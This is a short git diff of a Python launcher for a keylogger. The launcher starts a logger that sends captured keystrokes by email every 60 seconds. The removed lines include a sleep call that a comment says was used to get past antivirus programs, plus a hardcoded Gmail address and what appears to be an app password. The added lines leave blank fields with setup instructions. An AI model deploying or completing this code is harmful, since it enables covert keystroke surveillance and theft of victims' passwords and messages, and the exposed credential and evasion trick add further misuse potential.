@@ -2,12 +2,11 @@ import keylogger
 import time
 
 if __name__ == '__main__':
-    # time.sleep(120) #Used to bypass some of the antivirus programs
 
     #Set Up Variables
-    timer = 60
-    your_email = 'learner.vishwas.kapoor@gmail.com'
-    email_pass = 'qvdgkhlghlwvqvhn'
+    timer = 60      # Set duration (in seconds) after which the keylogger will send the encrypted logs via mail 
+    your_email = '' # Enter your email in which you want to recieve the logs
+    email_pass = '' # Enter the app password after configuring 2-step verification for your mail
 
     my_keylogger = keylogger.KeyLogger(interval=timer, email=your_email, password=email_pass)
     my_keylogger.start()
